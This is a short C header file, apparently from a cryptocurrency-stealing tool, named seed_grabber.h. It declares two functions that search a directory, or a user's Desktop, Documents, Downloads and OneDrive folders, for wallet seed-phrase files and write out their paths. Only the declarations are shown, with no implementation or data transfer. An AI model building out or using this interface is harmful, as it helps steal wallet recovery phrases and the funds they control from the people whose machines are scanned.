#ifndef SEED_GRABBER_H
#define SEED_GRABBER_H

#include <stddef.h>

// Scan a single directory for seed-phrase files.
// Writes results (filepath + word count) into output buffer.
// Returns 0 on success, -1 on error.
int seed_grabber_scan(const char *dir, char *output, size_t outlen);

// Scan standard user directories (Desktop, Documents, Downloads, OneDrive).
// Writes aggregated results into output buffer.
// Returns 0 on success, -1 on error.
int seed_grabber_collect(char *output, size_t outlen);

#endif
